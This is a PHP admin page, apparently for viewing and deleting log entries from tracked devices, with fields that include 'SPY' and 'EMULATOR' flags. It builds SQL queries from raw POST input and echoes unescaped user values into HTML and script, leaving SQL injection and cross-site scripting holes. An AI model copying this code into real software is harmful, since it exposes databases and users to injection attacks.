<html>
<head>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
    <link href="assets/css/tabulator.min.css" rel="stylesheet">
    <link href="assets/css/my.css" rel="stylesheet">
    <script type="text/javascript" src="assets/js/tabulator.min.js"></script>
<style>

</style>    
</head>

<body>
    <?php
        include("config.php");
        $passkey = "";
        if(isset($_POST['passkey'])) {
            $passkey = $_POST ["passkey"] ;
        }
        //echo $passkey;
        if(empty($passkey)) {
            echo"Empty passkey ";
    ?>
            <form action="" id="form" method="post">
                <input type="password" name="passkey" id="passkey" required> 
                <input type="submit" value="Login">
            </form>
    <?php
            return;
        }
        if(strcmp($passkey,$SERVER_PASS_KEY)!=0) {
          echo"Wrong passkey : '$passkey' Please contact admin to resolve issue." ;
          return;
        };
    ?>

    <?php
        $owner = "";
        $device_id = "";
        if(isset($_POST['owner'])) {
            $owner = $_POST ["owner"] ;
        } 
        if(isset($_POST['device_id'])) {
            $device_id = $_POST ["device_id"] ;
        }
        $sql = "SELECT * FROM `MESSAGE` ORDER BY id DESC";
        if(!(empty($owner) && empty($device_id))) {
            $sql = "SELECT * FROM `MESSAGE` where `OWNER`='$owner' and `DEVICE_ID`='$device_id' ORDER BY id DESC";
        } else {
            $sqlOwner = "SELECT DISTINCT OWNER, DEVICE_ID FROM `MESSAGE` ORDER BY DEVICE_ID DESC";
            $resultOwner = $connection->query($sqlOwner);
        }
        $result = $connection->query($sql);
        // echo "$sql";    
        if(!(empty($owner) && empty($device_id))) { ?>
                <div style="display: grid; grid-template-columns: 1fr 1fr; grid-gap: 20px; border: 0px solid blue">
                    <div>
                        Logs for OWNER: <b><?php echo $owner ?> </b> & DEVICE ID: <b><?php echo $device_id ?></b> 
                    </div>    
                    <div>
                        <form action="./delete.php" id="deleteForm" method="post" target="blank" >
                            <input type="hidden" name="owner" id="owner" value="<?php echo $owner ?>"> 
                            <input type="hidden" name="device_id" id="device_id" value="<?php echo $device_id ?>">
                            <input type="button" value="Delete logs" onClick="javascript: deleteLogs()">
                        </form>
                    </div>
                </div>
    <?php } else { ?>
            <form action="./display.php" id="loginForm" method="post" target="blank" >
                <input type="hidden" name="owner" id="owner" > 
                <input type="hidden" name="device_id" id="device_id" >
                <div style="display: grid; grid-template-columns: 1fr 1fr; grid-gap: 20px;">
                    <div>
                        <select type="select" class="form-control" id="alldevices" required>
                            <option value="0">Select Device </ption>
                            <?php
                            if ($resultOwner->num_rows > 0) {
                                while ($row = $resultOwner->fetch_assoc()) {        
                            ?>
                                <option value="<?php echo $row['OWNER'].'-'.$row['DEVICE_ID'] ?>"><?php echo $row['OWNER'].'-'.$row['DEVICE_ID'] ?></option>
                            <?php
                                }
                            }
                        ?>
                        </select>    
                    </div>
                    <div>
                        <input type="button" value="Submit" onClick="javascript: displayLogs()">
                    </div>
                </div>
            </form>
    <?php } ?>
    
    <?php if ($result->num_rows > 0) { ?>
        <div id="example-table"></div>
    <?php } else echo "<h2>No logs found</h2>" ?>

</body>
</html>
    
<script>

    function displayLogs() {
        //alert('inside');
        let loginForm = document.getElementById("loginForm");
        var devices = document.getElementById("alldevices");
        var value = devices.value;
        if(value=="0") {
            alert("Please select device for which logs need to be filtered")
        } else {
            var text = devices.options[devices.selectedIndex].text;
            //alert('value='+value+' text='+text);
            const myArray = text.split("-");
            document.getElementById("owner").value = myArray[0];
            document.getElementById("device_id").value = myArray[1];
            //alert('submitting...');
            loginForm.submit();
        }
    }
    
    function deleteLogs() {
        let deleteForm = document.getElementById("deleteForm");
        if (confirm("Are you surre to delete logs for this device ?") == true) {
          deleteForm.submit();
        } 
    }
    
    // "ID","OWNER","DEVICE_ID","SPY","TESTING","ACTIVE","BATTERY","MESSAGE","EMULATOR","ADDED_ON"

    var tabledata = [ // start of data
        <?php
            if ($result->num_rows > 0) {
                while ($row = $result->fetch_assoc()) { 
        ?>  
                    { ID:<?php echo $row['ID'] ?>, OWNER:"<?php echo $row['OWNER'] ?>", DEVICE_ID:<?php echo $row['DEVICE_ID'] ?>, SPY:<?php echo $row['SPY'] ?>, TESTING:<?php echo $row['TESTING'] ?>, ACTIVE:<?php echo $row['ACTIVE'] ?>, BATTERY:<?php echo $row['BATTERY'] ?>, EMULATOR: <?php echo $row['EMULATOR'] ?>, ADDED_ON:"<?php echo $row['ADDED_ON'] ?>", MESSAGE:"<?php echo $row['MESSAGE'] ?>" },   
        <?php       
                }  
            } 
        ?>
    ]; // end of data
    
    var table = new Tabulator("#example-table", {
        data:tabledata,           //load row data from array
        layout:"fitColumns",      //fit columns to width of table
        responsiveLayout:"hide",  //hide columns that don't fit on the table
        addRowPos:"top",          //when adding a new row, add it to the top of the table
        history:true,             //allow undo and redo actions on the table
        pagination:"local",       //paginate the data
        paginationSize:25,         //allow 7 rows per page of data
        paginationCounter:"rows", //display count of paginated rows in footer
        movableColumns:true,      //allow column order to be changed
        //initialSort:[             //set the initial sort order of the data
        //    {column:"name", dir:"asc"},
        //],
        sortMode: "",
        columnDefaults:{
            tooltip:true,         //show tool tips on cells
        },
        columns:[                 //define the table columns
            {title:"OWNER",     field:"OWNER",      width:100   },
            {title:"ID",        field:"DEVICE_ID",  width:130   },
            {title:"S",         field:"SPY",        width:30, formatter:"tickCross" }, 
            {title:"T",         field:"TESTING",    width:30   },
            {title:"A",         field:"ACTIVE",     width:30   },
            {title:"B",         field:"BATTERY",    width:30   },
            {title:"E",         field:"EMULATOR",   width:30   },
            {title:"ADDED_ON",  field:"ADDED_ON",   width:180   },
            {title:"MESSAGE",   field:"MESSAGE"},
        ],
    });
    
</script>
